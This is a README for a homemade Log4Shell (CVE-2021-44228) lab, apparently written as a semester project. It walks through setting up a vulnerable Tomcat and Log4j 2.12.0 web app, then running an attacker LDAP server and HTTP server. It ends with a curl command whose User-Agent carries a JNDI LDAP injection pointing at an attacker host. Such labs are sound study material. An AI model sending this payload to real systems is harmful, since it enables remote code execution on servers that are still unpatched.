# log4j-playground

This is standalone Log4j playground I developed as a semester project to exploit CVE-2021-44228. I found numerous setups, but they all were docker containers and I wanted to build something from scratch. So feel free to use it, modify it, or let me know if there's any issue. Have fun [safely]!

## Core Requirements:
1) Ubuntu Server (LTS)
2) Apache Tomcat 7.0.99
3) Log4j 2.12.0
4) JDK 7u80

We have a simple web application hosted on our Tomcat server solely for the functional purpose (there's no aesthetics :)) to emulate real-world webapp. And when someone enters some text, their input, as well as their user-agent gets logged by log4j for analysis (it's original purpose), and this is what we will exploit by requesting to [our] attacker-controlled LDAP server to provide remote codebase and make the server fetch it and execute it. On kali, spin a LDAP and an HTTP server to provide this codebase and BOOM! We can execute code remotely on the Ubuntu server!

All the files for the Ubuntu-server is in the `mywebapp` folder, and the files required to exploit is in the `ldap-server` folder.


## Vulnerable Ubuntu Server

1) To set-up the server, download Apache Tomcat and set it up in a system folder (ideally). I saved mine as `/opt/apache-tomcat`
2) Download and set-up [Java SE 7](https://www.oracle.com/ca-en/java/technologies/javase/javase7-archive-downloads.html) for the whole system.
3) Then go into the webapp folder and compile our simple web application using the following command. You can use the log4j modules I provided as-is, or go ahead and download from [official Apache archive](https://archive.apache.org/dist/logging/log4j/2.12.0/ "Index of /dist/logging/log4j/2.12.0") and follow further steps
```shell
javac -cp ".:WEB-INF/lib/*" -d WEB-INF/classes/ src/main/java/com/example/LogExampleServlet.java  -nowarn
```

4) Then copy and paste the whole folder in your `/PATH/TO/apache-tomcat/webapps/` folder
```shell
cp -r mywebapp /PATH/TO/apache-tomcat/webapps/
```

And this should load the webpage on `http://ubuntu-server:8080/mywebapp/index.jsp` if you check. And this is all there is to the vulnerable machine set-up!


Note: Idk but on initial testing, it wasn't seem to work, and I had to create a .war file and place it in my `webapps` folder. So you can see if the above steps also work for you or not. But if not, try the below (I am not a JAVA programmer, so don't ask me).
```shell
jar cvf mywebapp.war *
cp mywebapp.war ../
```

## Attacker Machine

### Payload

For our actual malicious code, compile the `Evail.java` file using the same vulnerable jdk version present in ubuntu (ie 7u80) (makes sense right?) using the following code.

```Shell
/PATH/TO/jdk1.7.0_80/bin/javac Evail.java -Xlint:deprecation
```

### LDAP Server 
For the LDAP Server, we download the LDAP library from [official LDAP site](https://ldap.com/unboundid-ldap-sdk-for-java/ "UnboundID LDAP SDK for Java") and compile our Server file and execute it.
```shell
javac -cp .:/opt/unboundid-ldapsdk-7.0.0/unboundid-ldapsdk.jar Server
java -cp .:/opt/unboundid-ldapsdk-7.0.0/unboundid-ldapsdk.jar Server
```
And on other terminal window, we spin our python server
```shell
python -m http.server 8000
```

### Exploit

Now the only step left to send our payload and let the whole process unfold.
```shell
curl ubuntu-server:8080/mywebapp/logExample -H 'User-Agent: ${jndi:ldap://192.168.56.101:9999/Evail}' 
```
